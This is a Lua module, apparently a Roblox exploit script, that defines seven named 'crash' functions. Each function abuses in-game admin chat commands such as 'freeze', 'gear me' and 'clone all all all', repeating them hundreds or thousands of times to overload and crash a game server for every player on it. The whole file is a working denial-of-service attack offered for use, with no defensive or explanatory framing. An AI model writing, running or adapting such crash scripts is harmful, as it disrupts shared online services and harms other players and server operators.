local chat = function(msg) game.Players:Chat(msg) end

local crash = {
    ['freezecrash'] = function()
        for i = 1, 100 do
            chat('freeze '..string.rep(' all', 40))
            task.wait()
        end
        for i = 1, 3450 do
            chat('clone all all all')
        end
    end,
    ['hatcrash'] = function()
        for i = 1, 100 do
            chat('hat all 000000000000000000000000000000012597599966')
            task.wait()
        end
        for i = 1, 3650 do
            chat('clone all all all')
        end
    end,
    ['shieldcrash'] = function()
        for i = 1, 100 do
            chat('shield/all/all/all/all/all/all/all')
            task.wait()
        end
        for i = 1, 4500 do
            chat('clone all all all')
        end
    end,
    ['chartreusecrash'] = function()
        for i = 1, 60 do
            chat('gear me 0000000000000000000080661504')
        end
        task.wait(0.7)
        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            v.Parent = game.Players.LocalPlayer.Character
        end
        task.wait(0.1)
        for i = 1, 2450 do
            chat('clone all all all all all all')
            task.wait()
        end
    end,
    ['hyperbikecrash'] = function()
        for i = 1, 60 do
            chat('gear me 0000000000000000000000477911027')
            task.wait()
        end
        task.wait(0.7)
        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            v.Parent = game.Players.LocalPlayer.Character
        end
        task.wait(0.1)
        for i = 1, 2450 do
            chat('clone all all all all all all')
            task.wait()
        end
    end,
    ['roboarmcrash'] = function()
        for i = 1, 60 do
            chat('gear me 000000000000000000000035366215')
        end
        task.wait(0.1)
        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            v.Parent = game.Players.LocalPlayer.Character
        end
        task.wait(0.1)
        for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v:IsA('Tool') then
                v:Activate()
            end
        end
    end,
    ['atomizercrash'] = function()
        for i = 1, 60 do
            chat('gear me 000000000000000000000035293856')
            task.wait()
        end
        task.wait(0.7)
        for _, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            v.Parent = game.Players.LocalPlayer.Character
        end
        task.wait(0.1)
        for i = 1, 2765 do
            chat('clone all all all')
            task.wait()
        end
    end
}

return crash
